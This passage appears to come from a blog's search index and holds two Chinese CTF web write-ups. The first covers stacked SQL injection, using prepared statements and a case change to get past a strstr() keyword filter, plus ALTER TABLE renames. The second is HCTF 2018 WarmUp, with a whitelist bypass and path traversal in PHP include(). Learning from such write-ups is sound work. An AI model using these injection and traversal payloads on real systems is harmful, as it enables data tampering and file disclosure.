mysql预制语句配合堆叠注入以及strstr()函数漏洞<br> payload </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;set @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);prepare stmt from @sql;EXECUTE stmt;#</span></span><br></pre></td></tr></table></figure><p> 拆开看</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">set @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">prepare stmt from @sql;</span></span><br><span class="line"><span class="string">EXECUTE stmt;</span></span><br><span class="line"><span class="string">#</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200209101208679.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200209101208679.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">strst函数报错过不了<br>可以采用大小写绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">Set @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">Prepare stmt from @sql;</span></span><br><span class="line"><span class="string">EXECUTE stmt;</span></span><br><span class="line"><span class="string">#</span></span><br></pre></td></tr></table></figure><p>第二种<br>通过alter修改列名和表名<br>已知信息是flag列名所在表名为‘1919810931114514’<br>而我们通过id查到的数据我们可以猜测为words表单<br>所以我们可以猜测后端sql查询语言为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> words <span class="keyword">where</span> id<span class="operator">=</span> <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>所以我们不妨1919810931114514表名把改为words；flag列名改为id，那么就可以得到flag了<br>所以payload为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(30);#</span></span><br></pre></td></tr></table></figure><p>wp引用学习来自<a href="http://www.saucer-man.com/information_security/302.html">http://www.saucer-man.com/information_security/302.html</a></p><h1 id="踩过的坑与学到的知识"><a href="#踩过的坑与学到的知识" class="headerlink" title="踩过的坑与学到的知识"></a>踩过的坑与学到的知识</h1><h2 id="坑1"><a href="#坑1" class="headerlink" title="坑1"></a>坑1</h2><p> 对堆叠注入不了解<br>在SQL中，分号（;）是用来表示一条sql语句的结束。 ; 结束一个sql语句后继续构造下一条语句，也就造就了堆叠注入。其实就是一次执行多个语句<br>具体参考<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html">堆叠注入</a></p><h2 id="坑2"><a href="#坑2" class="headerlink" title="坑2"></a>坑2</h2><p>数字表名要加反引号</p><h2 id="坑3"><a href="#坑3" class="headerlink" title="坑3"></a>坑3</h2><p>sql 预处理语句语句的不了解<br>预制语句的SQL语法基于三个SQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> stmt_name <span class="keyword">FROM</span> preparable_stmt;</span><br></pre></td></tr></table></figure><p> 预备一个语句，并赋予它名称stmt_name，preparable_stmt可以是一个文字字符串，也可以是一个包含了语句文本的用户变量。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span> stmt_name [<span class="keyword">USING</span> <span class="variable">@var</span>_name [, <span class="variable">@var</span>_name] ...];</span><br></pre></td></tr></table></figure><p> 使用一个EXECUTE语句（该语句引用了预制语句名称）来执行它。如果预制语句包含任何参数制造符，则您必须提供一个列举了用户变量（其中包含要与参数结合的值）的USING子句</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;</span><br></pre></td></tr></table></figure><p>要对一个预制语句解除分配，需使用DEALLOCATE PREPARE语句<br>以下SQL语句可以被用在预制语句中：CREATE TABLE, DELETE, DO, INSERT, REPLACE, SELECT, SET, UPDATE和多数的SHOW语句。目前不支持其它语句。<br>详细参考<a href="https://www.cnblogs.com/chenmh/articles/5308085.html">sql预处理语句</a></p><h2 id="坑4"><a href="#坑4" class="headerlink" title="坑4"></a>坑4</h2><p>strstr函数<br>大小区分不了解<br>strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。</p><p>注释：该函数是二进制安全的。</p><p>注释：该函数是区分大小写的。如需进行不区分大小写的搜索，请使用 stristr() 函数。<br>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> strstr(<span class="string">&quot;Hello world!&quot;</span>,<span class="string">&quot;world&quot;</span>);  <span class="comment">// 输出 world!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>详细参考<a href="https://www.runoob.com/php/func-string-strstr.html">菜鸟教程</a></p><h2 id="坑5"><a href="#坑5" class="headerlink" title="坑5"></a>坑5</h2><p>sql语法不太了解<br>尤其是alter的用法<br>详细参考<a href="https://www.w3school.com.cn/sql/sql_alter.asp">https://www.w3school.com.cn/sql/sql_alter.asp</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[HCTF 2018]WarmUp</title>
      <link href="2019/11/09/HCTF-2018-WarmUp/"/>
      <url>2019/11/09/HCTF-2018-WarmUp/</url>
      
        <content type="html"><![CDATA[<p>这个题好考文件包含，这个好像是某带cve编号的洞，不算难</p><span id="more"></span><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>上来一个超级滑稽脸（冥冥中仿佛滑稽看透了险恶的ctf世界的真相）。。<br>F12或者开发者工具看源码<br><img src="https://img-blog.csdnimg.cn/20191231140813911.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20191231140813911.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>注释中有提示那就访问一下<br>源码得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现include（）应该是文件包含<br>同时还发现白名单<br><img src="https://img-blog.csdnimg.cn/20191231140701598.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20191231140701598.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>不妨访问一下hint.php<br><img src="https://img-blog.csdnimg.cn/20191231141207515.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20191231141207515.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>很明显我们需要包含文件ffffllllaaaagggg这一文件</p><p>审计php源代码可知只要file这个文件在它的？号前面的符合白名单即可<br>从而<br><img src="https://img-blog.csdnimg.cn/20191231141451946.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20191231141451946.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>构造出payload </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>即可得到flag<br>这里用到了<code>../../../..</code>这种目录穿越从而利用目录遍历的手法</p><h2 id="学到的东西"><a href="#学到的东西" class="headerlink" title="学到的东西"></a>学到的东西</h2><p>php的函数</p><p>  <a href="https://www.runoob.com/php/func-string-mb_substr.html">参考菜鸟教程</a><br>mb_substr() 函数返回字符串的一部分<br>四个参数<br>str    必需。从该 string 中提取子字符串。<br>start    必需。规定在字符串的何处开始。<br>正数 - 在字符串的指定位置开始<br>负数 - 在从字符串结尾的指定位置开始<br>0 - 在字符串中的第一个字符处开始<br>length    可选。规定要返回的字符串长度。默认是直到字符串的结尾。<br>正数 - 从 start 参数所在的位置返回<br>负数 - 从字符串末端返回<br>encoding    可选。字符编码。如果省略，则使用内部字符编码。</p><p>mb_strpos（）反回字符或字符串在另一字符串的所在位置<br>int mb_strpos (   string $haystack ,   string $needle [,   int $offset = 0 [,   string $encoding = mb_internal_encoding() ]]   )<br>四个参数<br>haystack<br>The string being checked.<br>要被检查的 string。<br>needle<br>The string to find in haystack. In contrast with strpos(), numeric values are not applied as the ordinal value of a character.<br>在 haystack 中查找这个字符串。 和 strpos() 不同的是，数字的值不会被当做字符的顺序值。<br>offset（可选）<br>The search offset. If it is not specified, 0 is used. A negative offset counts from the end of the string.<br>搜索位置的偏移。如果没有提供该参数，将会使用 0。负数的 offset 会从字符串尾部开始统计。<br>encoding（可选）<br>The encoding parameter is the character encoding. If it is omitted, the internal character encoding value will be used.<br>encoding 参数为字符编码。如果省略，则使用内部字符编码。<br>Return Values<br>Returns the numeric position of the first occurrence of needle in the haystack string. If needle is not found, it returns FALSE.<br>返回 string 的 haystack 中 needle 首次出现位置的数值。 如果没有找到 needle，它将返回 FALSE。</p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
